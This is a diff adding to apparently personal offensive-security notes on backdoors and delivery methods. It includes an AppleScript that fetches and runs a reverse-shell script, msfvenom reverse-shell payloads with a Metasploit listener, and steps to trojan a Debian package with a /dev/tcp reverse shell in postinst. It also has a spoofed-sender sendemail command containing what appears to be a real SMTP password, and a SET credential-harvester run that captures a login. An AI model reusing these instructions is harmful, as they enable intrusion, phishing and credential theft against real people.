@@ -22,6 +22,7 @@ Tools
 - Powershell Empire (Back Door)
 - Veil (Back Door)
 - Fat Rat (Back Door)
+- msfvenom (Back Door)
 
 ZLogger
 -------
@@ -220,6 +221,8 @@ Exploit target:
 
 > service apache2 start
 
+"Fat Rat can be use to hack Android devices"
+
 Fat Rat
 --------
 "OKay Lets start Fat Rat"
@@ -305,7 +308,101 @@ Fat Rat
 
 > 6
 
-Backdoor Saved To : /root/Fatrat_Generated/rev_https_8081.bat        
+Backdoor Saved To : /root/Fatrat_Generated/rev_https_8081.bat   
+
+Apple Script
+------------
+do shell script "cd /tmp/ && curl http://pdf995.com/samples/pdf.pdf -O && open pdf.pdf;curl http://ip_address/evil-files/rev_tcp_4444.py -O && python rev_tcp_4444.py"
+
+Pip Installer
+------------
+"It is use to make class file for python source code target not to see source code"
+
+> cd /tmp/
+> pip installer pyinstaller
+> pyinstaller --onefile ZReporter.py
+
+"Give ZReport to target computer"
+"Run that on target computer"
+"WTF! ZReporter? See https://github.com/z00z/ZReporter/blob/master/ZReporter.py"
+
+target computer > ./ZReporter
+
+msfvenom
+---------
+> msfvenom
+
+MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /usr/bin/msfvenom [options] <var=val>
+Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+
+Options:
+    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
+    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
+        --list-options               List --payload <value>'s standard, advanced and evasion options
+    -f, --format          <format>   Output format (use --list formats to list)
+    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
+        --service-name    <value>    The service name to use when generating a service binary
+        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
+        --smallest                   Generate the smallest possible payload using all available encoders
+        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
+        --encrypt-key     <value>    A key to be used for --encrypt
+        --encrypt-iv      <value>    An initialization vector for --encrypt
+    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
+        --platform        <platform> The platform for --payload (use --list platforms to list)
+    -o, --out             <path>     Save the payload to a file
+    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
+    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
+        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
+    -s, --space           <length>   The maximum size of the resulting payload
+        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
+    -i, --iterations      <count>    The number of times to encode the payload
+    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
+    -x, --template        <path>     Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
+    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
+    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
+    -h, --help                       Show this message
+
+> msfvenom help
+> msfvenom -l payloads
+
+"Above command will list out payloads"
+
+> msfvenom -p python/meterpreter/reverse_tcp --list-options
+> msfvenom -p python/meterpreter/reverse_tcp LHOST=ip_address LPORT=port_number > file_name
+
+"Open msfconsole in new terminal"
+
+> msfconsole
+> use exploit/multi/handler
+>> show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.97.4     yes       The listen address (an interface may be specified)
+   LPORT  8080             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+>> set PAYLOAD python/meterpreter/reverse_tcp
+>> set LPORT port_number
+>> set LHOST ip_address
+>> exploit
 
 Powershell Empire
 -----------------
@@ -335,6 +432,10 @@ Powershell Empire
        0 listeners currently active
 
        0 agents currently active
+
+> agents
+
+"To kill agent type this (kill all)"       
 
 > listeners
 >> uselistener
@@ -495,6 +596,12 @@ osx/applescript           osx/safari_launcher       windows/launcher_bat      wi
 osx/application           osx/shellcode             windows/launcher_lnk      
 osx/ducky                 osx/teensy                windows/launcher_sct      
 osx/dylib                 windows/backdoorLnkMacro  windows/launcher_vbs
+
+"For Mac OS target, use osx/applescript"
+"Edit apple script in Script Editor from Mac Book and change icon"
+"Add NSUIElement and set it to 1 in plist file"
+
+"For Office Document in Mac OS target, use osx/macro"
 
 > usestager windows/launcher_bat
 >> info
@@ -704,6 +811,362 @@ Options:
 > execute
 
 [*] Stager output written out to: /var/www/html/evil-files/trojan_embedded_8080
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Delivery Methods
+----------------
+----------------
+
+Tools
+- BeEf
+- Setoolkit
+- sendemail
+
+Inject evil code in official linux package
+------------------------------------------
+Follow the Steps
+> Download .deb file
+> Type that command (dpkg -x package_name.deb folder_name)
+> Type (ar -x package_name.deb)
+> Go inside control folder and copy control, postinst(if exist) to /folder_name/DEBIAN/ and create file name postinst in /folder_name/DEBIAN/
+> Write the following code in postinst
+
+#!/bin/bash
+
+sudo bash -i >& /dev/tcp/ip_address/8080 0>&1
+
+> Type that command (dpkg-deb --build folder_name/)
+> It will come out folder_name.deb file
+> That file is back door file
+> Watch from Hacker machine by typing that command (nc -vv -l -p 8080)
+
+Send Email
+----------
+- Open account in sendinblue.com
+- Send via terminal from Kali linux
+
+> sendemail --help
+
+sendemail-1.56 by Brandon Zehm <caspian@dotconf.net>
+
+Synopsis:  sendemail -f ADDRESS [options]
+
+  Required:
+    -f ADDRESS                from (sender) email address
+    * At least one recipient required via -t, -cc, or -bcc
+    * Message body required via -m, STDIN, or -o message-file=FILE
+
+  Common:
+    -t ADDRESS [ADDR ...]     to email address(es)
+    -u SUBJECT                message subject
+    -m MESSAGE                message body
+    -s SERVER[:PORT]          smtp mail relay, default is localhost:25
+    -S [SENDMAIL_PATH]        use local sendmail utility (default: /usr/bin/sendmail) instead of network MTA
+
+  Optional:
+    -a   FILE [FILE ...]      file attachment(s)
+    -cc  ADDRESS [ADDR ...]   cc  email address(es)
+    -bcc ADDRESS [ADDR ...]   bcc email address(es)
+    -xu  USERNAME             username for SMTP authentication
+    -xp  PASSWORD             password for SMTP authentication
+
+  Paranormal:
+    -b BINDADDR[:PORT]        local host bind address
+    -l LOGFILE                log to the specified file
+    -v                        verbosity, use multiple times for greater effect
+    -q                        be quiet (i.e. no STDOUT output)
+    -o NAME=VALUE             advanced options, for details try: --help misc
+        -o message-content-type=<auto|text|html>
+        -o message-file=FILE         -o message-format=raw
+        -o message-header=HEADER     -o message-charset=CHARSET
+        -o reply-to=ADDRESS          -o timeout=SECONDS
+        -o username=USERNAME         -o password=PASSWORD
+        -o tls=<auto|yes|no>         -o fqdn=FQDN
+
+
+  Help:
+    --help                    the helpful overview you're reading now
+    --help addressing         explain addressing and related options
+    --help message            explain message body input and related options
+    --help networking         explain -s, -b, etc
+    --help output             explain logging and other output options
+    --help misc               explain -o options, TLS, SMTP auth, and more
+
+> sendemail -xu uchihamoee@gmail.com -xp znN4D5SbOh1HQM2t -s smtp-relay.sendinblue.com:587 -f "zuckerburg@facebook.com" -t "uchihatunn@gmail.com" -u "From Mark Zuckerburg to Zaw Moe Htike" -m "Nice to meet you" -o message-header="From: Mark Zuckerburg <zuckerburg@facebook.com>"
+
+"You can also send mail via 000webhost.com"
+
+"You can hack Mac OS or Linux by using pure social engineering by making them to type
+the following command in their terminal
+setsid bash -i >& /dev/tcp/ip_address/8080 0>&1"
+
+> nc -h
+
+[v1.10-46]
+connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
+listen for inbound:     nc -l -p port [-options] [hostname] [port]
+options:
+        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
+        -e filename             program to exec after connect [dangerous!!]
+        -b                      allow broadcasts
+        -g gateway              source-routing hop point[s], up to 8
+        -G num                  source-routing pointer: 4, 8, 12, ...
+        -h                      this cruft
+        -i secs                 delay interval for lines sent, ports scanned
+        -k                      set keepalive option on socket
+        -l                      listen mode, for inbound connects
+        -n                      numeric-only IP addresses, no DNS
+        -o file                 hex dump of traffic
+        -p port                 local port number
+        -r                      randomize local and remote ports
+        -q secs                 quit after EOF on stdin and delay of secs
+        -s addr                 local source address
+        -T tos                  set Type Of Service
+        -t                      answer TELNET negotiation
+        -u                      UDP mode
+        -v                      verbose [use twice to be more verbose]
+        -w secs                 timeout for connects and final net reads
+        -C                      Send CRLF as line-ending
+        -z                      zero-I/O mode [used for scanning]
+port numbers can be individual or ranges: lo-hi [inclusive];
+hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
+
+> nc -vv -l -p 8080
+>> id
+
+"We use WebScrapBook to fake login page"
+
+Setoolkit
+---------
+> setoolkit
+
+
+                      ..:::::::::..
+                  ..:::aad8888888baa:::..
+              .::::d:?88888888888?::8b::::.
+            .:::d8888:?88888888??a888888b:::.
+          .:::d8888888a8888888aa8888888888b:::.
+         ::::dP::::::::88888888888::::::::Yb::::
+        ::::dP:::::::::Y888888888P:::::::::Yb::::
+       ::::d8:::::::::::Y8888888P:::::::::::8b::::
+      .::::88::::::::::::Y88888P::::::::::::88::::.
+      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
+      :::::::Y88888888888P::|::Y88888888888P:::::::
+      ::::::::::::::::888:::|:::888::::::::::::::::
+      `:::::::::::::::8888888888888b::::::::::::::'
+       :::::::::::::::88888888888888::::::::::::::
+        :::::::::::::d88888888888888:::::::::::::
+         ::::::::::::88::88::88:::88::::::::::::
+          `::::::::::88::88::88:::88::::::::::'
+            `::::::::88::88::P::::88::::::::'
+              `::::::88::88:::::::88::::::'
+                 ``:::::::::::::::::::''
+                      ``:::::::::''
+
+[---]        The Social-Engineer Toolkit (SET)         [---]
+[---]        Created by: David Kennedy (ReL1K)         [---]
+                      Version: 8.0.3
+                    Codename: 'Maverick'
+[---]        Follow us on Twitter: @TrustedSec         [---]
+[---]        Follow me on Twitter: @HackingDave        [---]
+[---]       Homepage: https://www.trustedsec.com       [---]
+        Welcome to the Social-Engineer Toolkit (SET).                                                                     
+         The one stop shop for all of your SE needs.                                                                      
+                                                                                                                          
+   The Social-Engineer Toolkit is a product of TrustedSec.                                                                
+                                                                                                                          
+           Visit: https://www.trustedsec.com                                                                              
+                                                                                                                          
+   It's easy to update using the PenTesters Framework! (PTF)
+Visit https://github.com/trustedsec/ptf to update all your tools!                                                         
+                                                                                                                          
+                                                                                                                          
+ Unable to check for new version of SET (is your network up?)
+                                                                                                                          
+ Select from the menu:
+
+   1) Social-Engineering Attacks
+   2) Penetration Testing (Fast-Track)
+   3) Third Party Modules
+   4) Update the Social-Engineer Toolkit
+   5) Update SET configuration
+   6) Help, Credits, and About
+
+  99) Exit the Social-Engineer Toolkit
+
+>> 1
+
+
+          !\_________________________/!\
+          !!                         !! \
+          !! Social-Engineer Toolkit !!  \
+          !!                         !!  !
+          !!          Free           !!  !
+          !!                         !!  !
+          !!          #hugs          !!  !
+          !!                         !!  !
+          !!      By: TrustedSec     !!  /
+          !!_________________________!! /
+          !/_________________________\!/
+             __\_________________/__/!_
+            !_______________________!/
+          ________________________
+         /oooo  oooo  oooo  oooo /!
+        /ooooooooooooooooooooooo/ /
+       /ooooooooooooooooooooooo/ /
+      /C=_____________________/_/
+
+[---]        The Social-Engineer Toolkit (SET)         [---]
+[---]        Created by: David Kennedy (ReL1K)         [---]
+                      Version: 8.0.3
+                    Codename: 'Maverick'
+[---]        Follow us on Twitter: @TrustedSec         [---]
+[---]        Follow me on Twitter: @HackingDave        [---]
+[---]       Homepage: https://www.trustedsec.com       [---]
+        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+   The Social-Engineer Toolkit is a product of TrustedSec.                                                                
+                                                                                                                          
+           Visit: https://www.trustedsec.com                                                                              
+                                                                                                                          
+   It's easy to update using the PenTesters Framework! (PTF)
+Visit https://github.com/trustedsec/ptf to update all your tools!                                                         
+                                                                                                                          
+                                                                                                                          
+ Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) Wireless Access Point Attack Vector
+   8) QRCode Generator Attack Vector
+   9) Powershell Attack Vectors
+  10) Third Party Modules
+
+  99) Return back to the main menu.
+
+>>> 2
+
+The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.
+
+The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.
+
+The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.
+
+The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.
+
+The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.
+
+The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.
+
+   1) Java Applet Attack Method
+   2) Metasploit Browser Exploit Method
+   3) Credential Harvester Attack Method
+   4) Tabnabbing Attack Method
+   5) Web Jacking Attack Method
+   6) Multi-Attack Web Method
+   7) HTA Attack Method
+
+  99) Return to Main Menu
+
+>>>> 3
+
+ The first method will allow SET to import a list of pre-defined web
+ applications that it can utilize within the attack.
+
+ The second method will completely clone a website of your choosing
+ and allow you to utilize the attack vectors within the completely
+ same web application you were attempting to clone.
+
+ The third method allows you to import your own website, note that you
+ should only have an index.html when using the import website
+ functionality.
+   
+   1) Web Templates
+   2) Site Cloner
+   3) Custom Import
+
+  99) Return to Webattack Menu
+
+>>>>> 3
+
+[-] Credential harvester will allow you to utilize the clone capabilities within SET
+[-] to harvest credentials or parameters from a website as well as place them into a report
+
+-------------------------------------------------------------------------------
+--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---
+
+The way that this works is by cloning a site and looking for form fields to
+rewrite. If the POST fields are not usual methods for posting forms this 
+could fail. If it does, you can always save the HTML, rewrite the forms to
+be standard forms and use the "IMPORT" feature. Additionally, really 
+important:
+
+If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
+IP address below, not your NAT address. Additionally, if you don't know
+basic networking concepts, and you have a private IP address, you will
+need to do port forwarding to your NAT IP address from your external IP
+address. A browser doesns't know how to communicate with a private IP
+address, so if you don't specify an external IP address if you are using
+this from an external perpective, it will not work. This isn't a SET issue
+this is how networking works.
+
+set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.97.4]:192.168.97.4
+[!] Example: /home/website/ (make sure you end with /)
+[!] Also note that there MUST be an index.html in the folder you point to.
+set:webattack> Path to the website to be cloned:/home/zawmoehtike/Downloads/gitlab-fake/
+
+1. Copy just the index.html
+2. Copy the entire folder
+
+>>>>>> 2
+
+[-] Example: http://www.blah.com
+set:webattack> URL of the website you imported:
+
+"Open ip_address (192.168.97.4) in target browser and submit"
+"Wait in terminal from hacker machine"
+"You will get credentials of zawmoehtike"
+
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                                                                            
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80                                                                            
+[*] Information will be displayed to you as it arrives below:                                                             
+192.168.97.3 - - [06/Jun/2021 11:00:14] "GET / HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:00:15] "GET /e2216a7e9b73f5cb0279351c78ce61c33475cea7.gif HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:00:15] "GET /application-c5635015bed5bc1d572558840f8b24a5888a8ef2560bf4de5800dc7165defd51.css HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:00:16] "GET /favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:00:16] "GET /application_utilities-0ddca4d8c6df56558cc462315a481fd490f410149e4434ce02ad8b58b51badd7.css HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:00:16] "GET /white-3dc16a1a591e4b4ebf0a3b185f2a92790dada139f107cde1bcb5fa03a563b0c6.css HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:01:14] "GET / HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:01:14] "GET /application-c5635015bed5bc1d572558840f8b24a5888a8ef2560bf4de5800dc7165defd51.css HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:01:14] "GET /e2216a7e9b73f5cb0279351c78ce61c33475cea7.gif HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:01:15] "GET /application_utilities-0ddca4d8c6df56558cc462315a481fd490f410149e4434ce02ad8b58b51badd7.css HTTP/1.1" 200 -
+192.168.97.3 - - [06/Jun/2021 11:01:15] "GET /white-3dc16a1a591e4b4ebf0a3b185f2a92790dada139f107cde1bcb5fa03a563b0c6.css HTTP/1.1" 200 -
+[*] WE GOT A HIT! Printing the output:
+PARAM: authenticity_token=KVb/djBg+lkeOmwK7kwuSnLKs1xEAZgJ+5Kf6llEB/RK1lciqwV56nLoX0ygou4dUnTQ4x9SUvvZi0XPPCLfBg==        
+POSSIBLE USERNAME FIELD FOUND: user[login]=zawmoehtike                                                                    
+POSSIBLE USERNAME FIELD FOUND: user[password]=pwddwp111                                                                   
+POSSIBLE PASSWORD FIELD FOUND: user[password]=pwddwp111                                                                   
+POSSIBLE USERNAME FIELD FOUND: user[remember_me]=0                                                                        
+POSSIBLE USERNAME FIELD FOUND: user[remember_me]=1                                                                        
+PARAM: commit=Sign+in                                                                                                     
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                             
+                                                                                                                          
+                                                                                                                          
+192.168.97.3 - - [06/Jun/2021 11:01:31] "POST /sign_in HTTP/1.1" 302 -
+192.168.97.3 - - [06/Jun/2021 11:01:57] "GET /favicon.ico HTTP/1.1" 404 -
+
+BeEf
+----
+
+
+
 
 
 
